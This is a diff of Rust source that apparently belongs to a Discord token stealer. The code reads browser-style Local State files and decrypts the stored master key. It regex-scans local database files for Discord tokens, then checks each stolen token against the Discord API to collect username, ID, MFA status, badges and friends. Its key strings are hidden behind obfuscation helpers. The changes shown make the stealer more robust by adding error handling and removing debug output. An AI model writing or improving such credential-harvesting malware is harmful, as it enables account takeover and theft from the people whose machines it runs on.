@@ -104,39 +104,22 @@ pub fn badge_emojis(flags: u64) -> Vec<String> {
 
 pub async fn fetch_discord_user(client: &reqwest::Client, token: &str) -> Option<DiscordAccount> {
     let url = crate::s_api_url();
-    let token_prefix = &token[..20.min(token.len())];
     let auth_header = s_auth_header();
-    let res = match client
+    let res = client
         .get(&url)
         .header(&auth_header, token)
         .send()
         .await
-    {
-        Ok(r) => r,
-    };
+        .ok()?;
     if res.status().is_success() {
-        let body = match res.text().await {
-            Ok(t) => t,
-        };
-        let json: Value = match serde_json::from_str(&body) {
-            Ok(j) => j,
-        };
-        let username = match json[s_username_field()].as_str() {
-            Some(u) => u.to_string(),
-            None => {
-                let preview = &body[..200.min(body.len())];
-                return None;
-            }
-        };
-        let id = match json[s_id_field()].as_str() {
-            Some(i) => i.to_string(),
-        };
+        let body = res.text().await.ok()?;
+        let json: Value = serde_json::from_str(&body).ok()?;
+        let username = json[s_username_field()].as_str()?.to_string();
+        let id = json[s_id_field()].as_str()?.to_string();
         let public_flags = json[s_public_flags()].as_u64().unwrap_or(0);
         let mfa_enabled = json[s_mfa_enabled()].as_bool().unwrap_or(false);
         Some(DiscordAccount { username, id, token: token.to_string(), public_flags, mfa_enabled })
     } else {
-        let status = res.status();
-        let body = res.text().await.unwrap_or_default();
         None
     }
 }
@@ -151,12 +134,15 @@ pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec
         .await
     {
         Ok(r) => r,
+        Err(_) => return Vec::new(),
     };
     let body = match res.text().await {
         Ok(t) => t,
+        Err(_) => return Vec::new(),
     };
     let json: Value = match serde_json::from_str(&body) {
         Ok(j) => j,
+        Err(_) => return Vec::new(),
     };
     let arr = match json.as_array() {
         Some(a) => a,
@@ -196,20 +182,25 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
         let local_state_path = path.join(&local_state_name);
         let content = match fs::read_to_string(&local_state_path) {
             Ok(c) => c,
+            Err(_) => continue,
         };
         let json_ls: Value = match serde_json::from_str(&content) {
             Ok(v) => v,
+            Err(_) => continue,
         };
         let osc = s_os_crypt();
         let ek = s_encrypted_key();
         let enc_key_str = match json_ls[&osc][&ek].as_str() {
             Some(s) => s,
+            None => continue,
         };
         let bytes = match general_purpose::STANDARD.decode(enc_key_str) {
             Ok(b) => b,
+            Err(_) => continue,
         };
         let master_key = match decrypt_master_key(&bytes[5..]) {
             Some(k) => k,
+            None => continue,
         };
         let prof_path = path.clone();
         if !prof_path.exists() {
@@ -221,11 +212,13 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
         }
         let entries = match fs::read_dir(&db_path) {
             Ok(e) => e,
+            Err(_) => continue,
         };
         let marker = s_token_marker();
         let re_pattern = format!(r#"{}[^"]+"#, &marker);
         let re = match Regex::new(&re_pattern) {
             Ok(r) => r,
+            Err(_) => continue,
         };
         let mut entry_count = 0u32;
         for entry in entries.flatten() {
